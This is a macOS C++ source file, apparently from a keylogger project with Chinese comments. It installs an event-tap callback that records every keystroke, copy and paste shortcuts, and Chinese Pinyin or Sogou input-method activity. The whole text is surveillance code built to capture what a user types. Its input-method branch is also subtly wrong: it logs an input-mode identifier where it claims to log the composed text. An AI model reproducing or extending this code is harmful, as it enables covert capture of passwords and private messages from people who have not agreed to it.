#include "keylogger.h"
#include <CoreText/CoreText.h>

// macOS-specific implementation

static CGEventRef inputMethodCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    KeyLogger* logger = (KeyLogger*)refcon;
    
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        CGEventFlags flags = CGEventGetFlags(event);
        
        // 检查组合键
        if ((flags & kCGEventFlagMaskCommand) != 0) {  // 检测 Cmd 键
            if (keyCode == 0x08) {  // 'C' 键
                logger->logUnicode("[Cmd+C]");
            } else if (keyCode == 0x09) {  // 'V' 键
                logger->logUnicode("[Cmd+V]");
            }
        } else {
            // 检查是否是输入法的确认键（空格、数字键1-9、回车）
            if (keyCode == 0x31 || (keyCode >= 0x12 && keyCode <= 0x1B) || keyCode == 0x24) {
                // 获取输入法的最终输出
                TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
                if (currentKeyboard) {
                    CFStringRef inputSourceID = (CFStringRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyInputSourceID);
                    if (inputSourceID) {
                        char buffer[256];
                        if (CFStringGetCString(inputSourceID, buffer, sizeof(buffer), kCFStringEncodingUTF8)) {
                            std::string inputSource(buffer);
                            if (inputSource.find("Pinyin") != std::string::npos || inputSource.find("Sogou") != std::string::npos) {
                                // 处理拼音或搜狗输入法的输出
                                CFStringRef composedText = (CFStringRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyInputModeID);
                                if (composedText) {
                                    char composedBuffer[256];
                                    if (CFStringGetCString(composedText, composedBuffer, sizeof(composedBuffer), kCFStringEncodingUTF8)) {
                                        logger->logUnicode(composedBuffer);
                                    }
                                }
                            }
                        }
                    }
                    CFRelease(currentKeyboard);
                }
            } else {
                // 普通按键处理
                if (keyCodeMap.find(keyCode) != keyCodeMap.end()) {
                    logger->logKey(keyCodeMap[keyCode]);
                }
            }
        }
    }
    
    return event;
}
